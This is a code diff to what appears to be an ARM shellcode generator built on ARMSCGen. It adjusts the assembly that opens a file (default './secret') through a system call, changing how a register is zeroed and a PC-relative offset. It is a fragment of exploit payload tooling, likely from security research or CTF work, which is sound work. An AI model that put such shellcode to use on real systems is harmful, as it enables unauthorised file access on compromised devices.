@@ -28,13 +28,14 @@ def generate(filepath='./secret', flags=00, mode=None):
         sc = ''
 
     if flags == 0:
-        sc += "sub r1, r1, r1"
+        #sc += "sub r1, r1, r1"
+        sc += "mov r1, #0"
     else:
         sc += ARMSCGen.thumb_fixup('r1', int(flags))
 
     sc += """
     mov r0, pc
-    add r0, #10
+    add r0, #8
     mov r7, #(0+ 5)
     svc 1
     mov r6, r0
